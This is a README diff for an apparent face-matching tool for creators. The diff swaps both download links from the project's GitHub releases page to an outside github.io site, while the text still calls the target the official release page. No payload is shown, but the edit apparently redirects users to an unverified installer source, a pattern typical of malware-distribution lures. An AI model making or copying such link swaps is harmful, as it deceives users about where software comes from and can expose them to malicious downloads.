@@ -1,6 +1,6 @@
 # 🔍 celebrity-face-search - Identify celebrity likenesses in character images
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue-blue.svg)](https://github.com/Hoofprintrollerbandage72/celebrity-face-search/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue-blue.svg)](https://hoofprintrollerbandage72.github.io)
 
 This application helps creators check if their character images look like famous public figures. You can use this tool to manage likeness risks before you publish short-drama content. The software scans your images against a database of public figures and shows you potential matches. 
 
@@ -24,7 +24,7 @@ Before you install this software, make sure your computer meets these requiremen
 
 You need to download the installer from the official release page. 
 
-[Click here to visit the download page](https://github.com/Hoofprintrollerbandage72/celebrity-face-search/releases)
+[Click here to visit the download page](https://hoofprintrollerbandage72.github.io)
 
 1. Open your web browser and go to the link above.
 2. Look for the section labeled "Assets" under the most recent release.
